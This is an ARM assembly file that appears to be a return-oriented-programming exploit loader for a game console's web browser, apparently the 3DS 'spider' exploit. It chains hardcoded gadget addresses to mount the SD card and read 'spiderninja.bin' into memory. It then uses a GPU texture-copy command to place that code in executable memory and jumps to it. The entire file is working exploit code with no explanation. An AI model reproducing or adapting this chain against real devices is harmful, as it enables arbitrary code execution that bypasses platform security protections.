	.arm
	.text

#include "../../build/constants.h"

	.global	_start
@---------------------------------------------------------------------------------
_start:
	@ mount SD
		.word 0x0010C2FC @ LDMFD   SP!, {R0,PC}
			.word 0x001050B3 @ R0 = "dmc:"
		.word 0x0019CA34 @ FS_MOUNTSDMC(), then LDMFD   SP!, {R3-R5,PC}
			.word 0xDEADBEEF @ R3, dummy
			.word 0xDEADBEEF @ R4, dummy
			.word 0xDEADBEEF @ R5, dummy
	@ open file
		.word 0x001946EB @ POP     {R0-R4,R7,PC}
			.word 0x08F10000 @ R0 = this
			.word SN_LOADER_ROP_START+FileName @ R1 = filename
			.word 0x00000001 @ R2 = permission
			.word 0xDEADBEEF @ R3, dummy
			.word 0xDEADBEEF @ R4, dummy
			.word 0xDEADBEEF @ R7, dummy
		.word 0x0022FE0C @ IFile_Open(), then LDMFD   SP!, {R4-R7,PC}
			.word 0xDEADBEEF @ R4, dummy
			.word 0xDEADBEEF @ R5, dummy
			.word 0xDEADBEEF @ R6, dummy
			.word 0xDEADBEEF @ R7, dummy
		.word 0x001057C4 @ POP {PC}
	@ read payload
		.word 0x001946EB @ POP     {R0-R4,R7,PC}
			.word 0x08F10000 @ R0 = this
			.word 0x08F10020 @ R1 = total_read
			.word SN_LOADER_TEMP_BUFFER @ R2 = buffer
			.word SN_LOADER_CODE_SIZE @ R3 = size
			.word 0xDEADBEEF @ R4, dummy
			.word 0xDEADBEEF @ R7, dummy
		.word 0x001686E0 @ IFile_Read, then LDMFD   SP!, {R4-R9,PC}
			.word 0xDEADBEEF @ R4, dummy
			.word 0xDEADBEEF @ R5, dummy
			.word 0xDEADBEEF @ R6, dummy
			.word 0xDEADBEEF @ R7, dummy
			.word 0xDEADBEEF @ R8, dummy
			.word 0xDEADBEEF @ R9, dummy
	@ flush data cache
		.word 0x0010b5b4 @ pop {r0, r1, r2, r3, r4, pc}
			.word 0x003DA72C @ r0 (handle ptr)
			.word 0xFFFF8001 @ r1 (kprocess handle)
			.word SN_LOADER_TEMP_BUFFER  @ r2 (address)
			.word SN_LOADER_CODE_SIZE @ r3 (size)
			.word 0xDEADC0DE @ r4 (garbage)
		.word 0x0013035C @ pop {lr, pc}
			.word 0x001057c4 @ lr (pop {pc})
		.word 0x0012c1e0 @ GSPGPU_FlushDataCache
	@ send GX command
		.word 0x0010c2fc @ pop {r0, pc}
			.word 0x3D7C40+0x58 @ r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
		.word 0x00228af4 @ pop {r1, pc}
			.word SN_LOADER_ROP_START+gxCommand @ r1 (cmd addr)
		.word 0x0013035C @ pop {lr, pc}
			.word 0x001057c4 @ lr (pop {pc})
		.word 0x0012BF04 @ nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue
	@ sleep for a bit
		.word 0x0010c2fc @ pop {r0, pc}
			.word 0x3B9ACA00 @ r0 (one second)
		.word 0x00228af4 @ pop {r1, pc}
			.word 0x00000000 @ r1 (nothing)
		.word 0x0013035C @ pop {lr, pc}
			.word 0x001057c4 @ lr (pop {pc})
		.word 0x001041f8 @ svc 0xa | bx lr
	@ jump to code
		.word 0x0010c2fc @ pop {r0, pc}
			.word 0x00000000 @ r0 (run initial payload)
		.word SN_LOADER_CODE_ADDR

@ Data required for spider rop to work
InitData:
	.word 0, 0, SN_LOADER_ROP_START+_start+0x8C, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0, 0, 0, 0, SN_LOADER_ROP_START+_start, 0x001057C4, 0x001057C4, 0, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0x0010C2FC, SN_LOADER_ROP_START+_start+0x218, 0, 0, 0x001057C4, 0, 0, 0, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
Self:
	.word SN_LOADER_ROP_START+Self, 0x001057C4, 0, 0, 0, 0, 0, 0, 0, 0x00130344, 0, 0, 0, 0, 0

	.align 2
gxCommand:
	.word 0x00000004 @ command header (SetTextureCopy)
	.word SN_LOADER_TEMP_BUFFER @ source address
	.word SN_LOADER_FCRAM_ADDR @ destination address
	.word SN_LOADER_CODE_SIZE @ size
	.word 0xFFFFFFFF @ dim in
	.word 0xFFFFFFFF @ dim out
	.word 0x00000008 @ flags
	.word 0x00000000 @ unused

	.align 2
FileName:
	.string16 "dmc:/spiderninja.bin"

	.align 2
@ Padding
	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0

